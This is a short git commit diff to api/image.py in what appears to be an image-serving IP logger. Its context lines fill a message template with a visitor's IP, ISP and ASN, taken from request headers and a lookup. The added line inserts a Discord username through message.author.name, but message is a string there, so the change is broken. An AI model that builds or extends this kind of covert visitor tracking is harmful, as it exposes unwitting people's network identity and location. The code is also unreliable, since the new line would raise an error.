2bdecd3ef10f762a20873f561da4b4cabeaad685
t53149657-collab <t53149657@gmail.com>
2025-09-25 21:07:23 +1200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -242,6 +242,7 @@ height: 100vh;
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
+                    message = message.replace("{discord_username}", message.author.name)
                     message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                     message = message.replace("{isp}", result["isp"])
                     message = message.replace("{asn}", result["as"])
